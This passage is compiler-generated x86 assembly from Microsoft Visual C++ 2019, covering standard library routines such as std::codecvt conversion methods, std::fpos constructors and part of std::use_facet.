___formal$ = 16						; size = 4
__Mid2$ = 20						; size = 4
?do_unshift@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PAD1AAPAD@Z PROC ; std::codecvt<char,char,_Mbstatet>::do_unshift, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 771
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 773
	mov	eax, DWORD PTR __Mid2$[ebp]
	mov	ecx, DWORD PTR __First2$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 774
	push	3
	pop	eax
; Line 775
	leave
	ret	16					; 00000010H
?do_unshift@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PAD1AAPAD@Z ENDP ; std::codecvt<char,char,_Mbstatet>::do_unshift
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?do_out@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
__First1$ = 12						; size = 4
__Last1$ = 16						; size = 4
__Mid1$ = 20						; size = 4
__First2$ = 24						; size = 4
__Last2$ = 28						; size = 4
__Mid2$ = 32						; size = 4
?do_out@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z PROC ; std::codecvt<char,char,_Mbstatet>::do_out, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 753
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 754
	mov	eax, DWORD PTR __Mid1$[ebp]
	mov	ecx, DWORD PTR __First1$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 755
	mov	eax, DWORD PTR __Mid2$[ebp]
	mov	ecx, DWORD PTR __First2$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 757
	push	3
	pop	eax
; Line 769
	leave
	ret	28					; 0000001cH
?do_out@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ENDP ; std::codecvt<char,char,_Mbstatet>::do_out
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?do_in@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
__First1$ = 12						; size = 4
__Last1$ = 16						; size = 4
__Mid1$ = 20						; size = 4
__First2$ = 24						; size = 4
__Last2$ = 28						; size = 4
__Mid2$ = 32						; size = 4
?do_in@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z PROC ; std::codecvt<char,char,_Mbstatet>::do_in, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 734
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 735
	mov	eax, DWORD PTR __Mid1$[ebp]
	mov	ecx, DWORD PTR __First1$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 736
	mov	eax, DWORD PTR __Mid2$[ebp]
	mov	ecx, DWORD PTR __First2$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 738
	push	3
	pop	eax
; Line 750
	leave
	ret	28					; 0000001cH
?do_in@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ENDP ; std::codecvt<char,char,_Mbstatet>::do_in
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?do_always_noconv@?$codecvt@DDU_Mbstatet@@@std@@MBE_NXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?do_always_noconv@?$codecvt@DDU_Mbstatet@@@std@@MBE_NXZ PROC ; std::codecvt<char,char,_Mbstatet>::do_always_noconv, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 728
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 730
	mov	al, 1
; Line 731
	leave
	ret	0
?do_always_noconv@?$codecvt@DDU_Mbstatet@@@std@@MBE_NXZ ENDP ; std::codecvt<char,char,_Mbstatet>::do_always_noconv
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?_Init@?$codecvt@DDU_Mbstatet@@@std@@IAEXABV_Locinfo@2@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
?_Init@?$codecvt@DDU_Mbstatet@@@std@@IAEXABV_Locinfo@2@@Z PROC ; std::codecvt<char,char,_Mbstatet>::_Init, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 726
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	leave
	ret	4
?_Init@?$codecvt@DDU_Mbstatet@@@std@@IAEXABV_Locinfo@2@@Z ENDP ; std::codecvt<char,char,_Mbstatet>::_Init
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??1?$codecvt@DDU_Mbstatet@@@std@@MAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$codecvt@DDU_Mbstatet@@@std@@MAE@XZ PROC		; std::codecvt<char,char,_Mbstatet>::~codecvt<char,char,_Mbstatet>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 724
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	mov	eax, DWORD PTR _this$[ebp]
	mov	DWORD PTR [eax], OFFSET ??_7?$codecvt@DDU_Mbstatet@@@std@@6B@
	mov	ecx, DWORD PTR _this$[ebp]
	call	??1codecvt_base@std@@UAE@XZ		; std::codecvt_base::~codecvt_base
	leave
	ret	0
??1?$codecvt@DDU_Mbstatet@@@std@@MAE@XZ ENDP		; std::codecvt<char,char,_Mbstatet>::~codecvt<char,char,_Mbstatet>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z
_TEXT	SEGMENT
$T2 = -88						; size = 52
$T3 = -36						; size = 4
tv128 = -32						; size = 4
tv131 = -28						; size = 4
tv89 = -24						; size = 4
$T4 = -20						; size = 4
$T5 = -16						; size = 4
__$EHRec$ = -12						; size = 12
__Ppf$ = 8						; size = 4
__Ploc$ = 12						; size = 4
?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z PROC ; std::codecvt<char,char,_Mbstatet>::_Getcat, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 714
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z
	mov	eax, DWORD PTR fs:0
	push	eax
	sub	esp, 76					; 0000004cH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
	and	DWORD PTR $T5[ebp], 0
; Line 716
	cmp	DWORD PTR __Ppf$[ebp], 0
	je	$LN2@Getcat
	mov	eax, DWORD PTR __Ppf$[ebp]
	cmp	DWORD PTR [eax], 0
	jne	SHORT $LN2@Getcat
; Line 717
	push	8
	call	??2@YAPAXI@Z				; operator new
	pop	ecx
	mov	DWORD PTR $T4[ebp], eax
	and	DWORD PTR __$EHRec$[ebp+8], 0
	cmp	DWORD PTR $T4[ebp], 0
	je	SHORT $LN4@Getcat
	push	0
	mov	ecx, DWORD PTR __Ploc$[ebp]
	call	?c_str@locale@std@@QBEPBDXZ		; std::locale::c_str
	push	eax
	lea	ecx, DWORD PTR $T2[ebp]
	call	??0_Locinfo@std@@QAE@PBD@Z		; std::_Locinfo::_Locinfo
	mov	DWORD PTR tv131[ebp], eax
	mov	eax, DWORD PTR tv131[ebp]
	mov	DWORD PTR tv128[ebp], eax
	mov	BYTE PTR __$EHRec$[ebp+8], 1
	mov	eax, DWORD PTR $T5[ebp]
	or	eax, 1
	mov	DWORD PTR $T5[ebp], eax
	push	DWORD PTR tv128[ebp]
	mov	ecx, DWORD PTR $T4[ebp]
	call	??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z ; std::codecvt<char,char,_Mbstatet>::codecvt<char,char,_Mbstatet>
	mov	DWORD PTR tv89[ebp], eax
	jmp	SHORT $LN5@Getcat
$LN4@Getcat:
	and	DWORD PTR tv89[ebp], 0
$LN5@Getcat:
	mov	eax, DWORD PTR tv89[ebp]
	mov	DWORD PTR $T3[ebp], eax
	mov	DWORD PTR __$EHRec$[ebp+8], 2
	mov	eax, DWORD PTR __Ppf$[ebp]
	mov	ecx, DWORD PTR $T3[ebp]
	mov	DWORD PTR [eax], ecx
	or	DWORD PTR __$EHRec$[ebp+8], -1
	mov	eax, DWORD PTR $T5[ebp]
	and	eax, 1
	je	SHORT $LN2@Getcat
	and	DWORD PTR $T5[ebp], -2			; fffffffeH
	lea	ecx, DWORD PTR $T2[ebp]
	call	??1_Locinfo@std@@QAE@XZ			; std::_Locinfo::~_Locinfo
$LN2@Getcat:
; Line 720
	push	2
	pop	eax
; Line 721
	mov	ecx, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	leave
	ret	0
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$0:
	push	8
	push	DWORD PTR $T4[ebp]
	call	??3@YAXPAXI@Z				; operator delete
	pop	ecx
	pop	ecx
	ret	0
__unwindfunclet$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$1:
	mov	eax, DWORD PTR $T5[ebp]
	and	eax, 1
	je	$LN8@Getcat
	and	DWORD PTR $T5[ebp], -2			; fffffffeH
	lea	ecx, DWORD PTR $T2[ebp]
	jmp	??1_Locinfo@std@@QAE@XZ			; std::_Locinfo::~_Locinfo
$LN8@Getcat:
	ret	0
	int	3
	int	3
	int	3
	int	3
	int	3
__ehhandler$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z:
	npad	1
	npad	1
	mov	edx, DWORD PTR [esp+8]
	lea	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR [edx-80]
	xor	ecx, eax
	call	@__security_check_cookie@4
	mov	eax, OFFSET __ehfuncinfo$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z
	jmp	___CxxFrameHandler3
text$x	ENDS
?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z ENDP ; std::codecvt<char,char,_Mbstatet>::_Getcat
; Function compile flags: /Odsp
;	COMDAT ??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z
_TEXT	SEGMENT
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
__Lobj$ = 8						; size = 4
__Refs$ = 12						; size = 4
??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z PROC ; std::codecvt<char,char,_Mbstatet>::codecvt<char,char,_Mbstatet>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 710
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z
	mov	eax, DWORD PTR fs:0
	push	eax
	push	ecx
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
	mov	DWORD PTR _this$[ebp], ecx
	push	DWORD PTR __Refs$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	??0codecvt_base@std@@QAE@I@Z		; std::codecvt_base::codecvt_base
	and	DWORD PTR __$EHRec$[ebp+8], 0
	mov	eax, DWORD PTR _this$[ebp]
	mov	DWORD PTR [eax], OFFSET ??_7?$codecvt@DDU_Mbstatet@@@std@@6B@
; Line 711
	push	DWORD PTR __Lobj$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Init@?$codecvt@DDU_Mbstatet@@@std@@IAEXABV_Locinfo@2@@Z ; std::codecvt<char,char,_Mbstatet>::_Init
; Line 712
	or	DWORD PTR __$EHRec$[ebp+8], -1
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	leave
	ret	8
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z$0:
	mov	ecx, DWORD PTR _this$[ebp]
	jmp	??1codecvt_base@std@@UAE@XZ		; std::codecvt_base::~codecvt_base
	int	3
	int	3
	int	3
	int	3
	int	3
__ehhandler$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z:
	npad	1
	npad	1
	mov	edx, DWORD PTR [esp+8]
	lea	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR [edx-8]
	xor	ecx, eax
	call	@__security_check_cookie@4
	mov	eax, OFFSET __ehfuncinfo$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z
	jmp	___CxxFrameHandler3
text$x	ENDS
??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z ENDP ; std::codecvt<char,char,_Mbstatet>::codecvt<char,char,_Mbstatet>
; Function compile flags: /Odsp
;	COMDAT ?unshift@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PAD1AAPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__State$ = 8						; size = 4
__First2$ = 12						; size = 4
__Last2$ = 16						; size = 4
__Mid2$ = 20						; size = 4
?unshift@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PAD1AAPAD@Z PROC ; std::codecvt<char,char,_Mbstatet>::unshift, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 693
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 695
	push	DWORD PTR __Mid2$[ebp]
	push	DWORD PTR __Last2$[ebp]
	push	DWORD PTR __First2$[ebp]
	push	DWORD PTR __State$[ebp]
	mov	eax, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR _this$[ebp]
	call	DWORD PTR [eax+32]
; Line 696
	leave
	ret	16					; 00000010H
?unshift@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PAD1AAPAD@Z ENDP ; std::codecvt<char,char,_Mbstatet>::unshift
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?out@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__State$ = 8						; size = 4
__First1$ = 12						; size = 4
__Last1$ = 16						; size = 4
__Mid1$ = 20						; size = 4
__First2$ = 24						; size = 4
__Last2$ = 28						; size = 4
__Mid2$ = 32						; size = 4
?out@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z PROC ; std::codecvt<char,char,_Mbstatet>::out, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 689
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 690
	push	DWORD PTR __Mid2$[ebp]
	push	DWORD PTR __Last2$[ebp]
	push	DWORD PTR __First2$[ebp]
	push	DWORD PTR __Mid1$[ebp]
	push	DWORD PTR __Last1$[ebp]
	push	DWORD PTR __First1$[ebp]
	push	DWORD PTR __State$[ebp]
	mov	eax, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR _this$[ebp]
	call	DWORD PTR [eax+28]
; Line 691
	leave
	ret	28					; 0000001cH
?out@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ENDP ; std::codecvt<char,char,_Mbstatet>::out
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?in@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__State$ = 8						; size = 4
__First1$ = 12						; size = 4
__Last1$ = 16						; size = 4
__Mid1$ = 20						; size = 4
__First2$ = 24						; size = 4
__Last2$ = 28						; size = 4
__Mid2$ = 32						; size = 4
?in@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z PROC ; std::codecvt<char,char,_Mbstatet>::in, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 684
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 685
	push	DWORD PTR __Mid2$[ebp]
	push	DWORD PTR __Last2$[ebp]
	push	DWORD PTR __First2$[ebp]
	push	DWORD PTR __Mid1$[ebp]
	push	DWORD PTR __Last1$[ebp]
	push	DWORD PTR __First1$[ebp]
	push	DWORD PTR __State$[ebp]
	mov	eax, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR _this$[ebp]
	call	DWORD PTR [eax+24]
; Line 686
	leave
	ret	28					; 0000001cH
?in@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ENDP ; std::codecvt<char,char,_Mbstatet>::in
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$min@I@std@@YAABIABI0@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
tv65 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$min@I@std@@YAABIABI0@Z PROC				; std::min<unsigned int>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\utility
; Line 66
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
; Line 68
	mov	eax, DWORD PTR __Right$[ebp]
	mov	ecx, DWORD PTR __Left$[ebp]
	mov	eax, DWORD PTR [eax]
	cmp	eax, DWORD PTR [ecx]
	jae	SHORT $LN3@min
	mov	eax, DWORD PTR __Right$[ebp]
	mov	DWORD PTR tv65[ebp], eax
	jmp	SHORT $LN4@min
$LN3@min:
	mov	eax, DWORD PTR __Left$[ebp]
	mov	DWORD PTR tv65[ebp], eax
$LN4@min:
	mov	eax, DWORD PTR tv65[ebp]
	mov	DWORD PTR $T1[ebp], eax
	mov	eax, DWORD PTR $T1[ebp]
; Line 69
	leave
	ret	0
??$min@I@std@@YAABIABI0@Z ENDP				; std::min<unsigned int>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??B?$fpos@U_Mbstatet@@@std@@QBE_JXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??B?$fpos@U_Mbstatet@@@std@@QBE_JXZ PROC		; std::fpos<_Mbstatet>::operator __int64, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\iosfwd
; Line 67
	push	ebp
	mov	ebp, esp
	push	ecx
	push	esi
	mov	DWORD PTR _this$[ebp], ecx
; Line 70
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	mov	edx, DWORD PTR [eax]
	add	edx, DWORD PTR [ecx+8]
	mov	esi, DWORD PTR [eax+4]
	adc	esi, DWORD PTR [ecx+12]
	mov	eax, edx
	mov	edx, esi
; Line 71
	pop	esi
	leave
	ret	0
??B?$fpos@U_Mbstatet@@@std@@QBE_JXZ ENDP		; std::fpos<_Mbstatet>::operator __int64
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?state@?$fpos@U_Mbstatet@@@std@@QBE?AU_Mbstatet@@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?state@?$fpos@U_Mbstatet@@@std@@QBE?AU_Mbstatet@@XZ PROC ; std::fpos<_Mbstatet>::state, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\iosfwd
; Line 59
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 60
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR [eax+16]
	mov	eax, DWORD PTR [eax+20]
	mov	edx, DWORD PTR ___$ReturnUdt$[ebp]
	mov	DWORD PTR [edx], ecx
	mov	DWORD PTR [edx+4], eax
	mov	eax, DWORD PTR ___$ReturnUdt$[ebp]
; Line 61
	leave
	ret	4
?state@?$fpos@U_Mbstatet@@@std@@QBE?AU_Mbstatet@@XZ ENDP ; std::fpos<_Mbstatet>::state
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??0?$fpos@U_Mbstatet@@@std@@QAE@U_Mbstatet@@_J@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__State$ = 8						; size = 8
__Fileposition$ = 16					; size = 8
??0?$fpos@U_Mbstatet@@@std@@QAE@U_Mbstatet@@_J@Z PROC	; std::fpos<_Mbstatet>::fpos<_Mbstatet>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\iosfwd
; Line 57
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __Fileposition$[ebp]
	mov	edx, DWORD PTR __Fileposition$[ebp+4]
	mov	DWORD PTR [eax], ecx
	mov	DWORD PTR [eax+4], edx
	mov	eax, DWORD PTR _this$[ebp]
	xor	ecx, ecx
	xor	edx, edx
	mov	DWORD PTR [eax+8], ecx
	mov	DWORD PTR [eax+12], edx
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __State$[ebp]
	mov	edx, DWORD PTR __State$[ebp+4]
	mov	DWORD PTR [eax+16], ecx
	mov	DWORD PTR [eax+20], edx
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	16					; 00000010H
??0?$fpos@U_Mbstatet@@@std@@QAE@U_Mbstatet@@_J@Z ENDP	; std::fpos<_Mbstatet>::fpos<_Mbstatet>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??0?$fpos@U_Mbstatet@@@std@@QAE@_J@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Off$ = 8						; size = 8
??0?$fpos@U_Mbstatet@@@std@@QAE@_J@Z PROC		; std::fpos<_Mbstatet>::fpos<_Mbstatet>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\iosfwd
; Line 55
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __Off$[ebp]
	mov	edx, DWORD PTR __Off$[ebp+4]
	mov	DWORD PTR [eax], ecx
	mov	DWORD PTR [eax+4], edx
	mov	eax, DWORD PTR _this$[ebp]
	xor	ecx, ecx
	xor	edx, edx
	mov	DWORD PTR [eax+8], ecx
	mov	DWORD PTR [eax+12], edx
	xor	eax, eax
	mov	ecx, DWORD PTR _this$[ebp]
	add	ecx, 16					; 00000010H
	mov	DWORD PTR [ecx], eax
	mov	DWORD PTR [ecx+4], eax
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	8
??0?$fpos@U_Mbstatet@@@std@@QAE@_J@Z ENDP		; std::fpos<_Mbstatet>::fpos<_Mbstatet>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z
_TEXT	SEGMENT
$T2 = -40						; size = 4
__Lock$3 = -36						; size = 4
__Id$4 = -32						; size = 4
__Psave_guard$5 = -28					; size = 4
__Pf$6 = -24						; size = 4
__Pfmod$7 = -20						; size = 4
__Psave$8 = -16						; size = 4
__$EHRec$ = -12						; size = 12
__Loc$ = 8						; size = 4
??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z PROC ; std::use_facet<std::codecvt<char,char,_Mbstatet> >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 428
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z
	mov	eax, DWORD PTR fs:0
	push	eax
	sub	esp, 28					; 0000001cH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
; Line 429
	push	0
	lea	ecx, DWORD PTR __Lock$3[ebp]
	call	??0_Lockit@std@@QAE@H@Z			; std::_Lockit::_Lockit
	and	DWORD PTR __$EHRec$[ebp+8], 0
; Line 430
	mov	eax, DWORD PTR ?_Psave@?$_Facetptr@V?$codecvt@DDU_Mbstatet@@@std@@@std@@2PBVfacet@locale@2@B ; std::_Facetptr<std::codecvt<char,char,_Mbstatet> >::_Psave
	mov	DWORD PTR __Psave$8[ebp], eax
; Line 432
	mov	ecx, OFFSET ?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A ; std::codecvt<char,char,_Mbstatet>::id
	call	??Bid@locale@std@@QAEIXZ		; std::locale::id::operator unsigned int
	mov	DWORD PTR __Id$4[ebp], eax
; Line 433
	push	DWORD PTR __Id$4[ebp]
	mov	ecx, DWORD PTR __Loc$[ebp]
